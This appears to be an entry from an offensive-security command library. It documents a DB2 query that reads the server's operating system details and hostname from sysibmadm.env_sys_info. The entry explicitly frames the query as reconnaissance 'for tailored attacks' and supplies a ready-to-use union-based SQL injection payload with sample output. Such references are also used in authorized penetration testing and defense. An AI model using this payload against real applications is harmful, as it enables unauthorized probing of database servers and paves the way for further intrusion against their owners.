---
type: command
executor: sql
data: >-
  select os_name,os_version,os_release,host_name from sysibmadm.env_sys_info --
  requires priv
output: null
created_at: '2023-04-06T03:56:33.151418+00:00'
updated_at: '2023-04-10T20:22:02.290872+00:00'
platforms:
  - Linux
  - Windows
  - Database
tags:
  - db2
  - injection
  - discovery
verified: true
validated: true
---

# db2-query-system-environment-info

## Command

```sql
select os_name,os_version,os_release,host_name from sysibmadm.env_sys_info -- requires priv
```

## Description

This SQL command queries the DB2 sysibmadm.env_sys_info system table to retrieve key environmental details about the host system running the database instance. It is typically executed via SQL injection in a vulnerable application or within a stored procedure/UDF, requiring appropriate privileges. Use this during reconnaissance to identify the OS and hostname for tailored attacks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| os_name | Retrieves the operating system name (e.g., 'Linux', 'AIX') | Built-in |
| os_version | Retrieves the OS version number | Built-in |
| os_release | Retrieves the OS release level | Built-in |
| host_name | Retrieves the hostname of the DB2 server | Built-in |
| from sysibmadm.env_sys_info | Specifies the system administrative view containing environment data | Yes |
| -- requires priv | Comment indicating privilege requirements; ignores trailing input in injection contexts | No |

## Examples

### Basic Usage

```sql
select os_name,os_version,os_release,host_name from sysibmadm.env_sys_info;
```

### Injected Usage (Union-Based)

```sql
' UNION SELECT os_name,os_version,os_release,host_name FROM sysibmadm.env_sys_info --
```

## Expected Output

Successful execution returns a result set like:

| OS_NAME | OS_VERSION | OS_RELEASE | HOST_NAME   |
|---------|------------|------------|-------------|
| Linux   | 4.18.0-305 | el8.x86_64 | dbserver-01 |

If privileges are lacking, DB2 returns error SQL0551N: 'USER' does not have the privilege to perform operation 'SELECT' on object 'SYSIBMADM.ENV_SYS_INFO'.

## Related

- [[procedures/DB2-SQL-Injection-for-System-Information-Discovery]]
- [[techniques/System Information Discovery|T1082]]
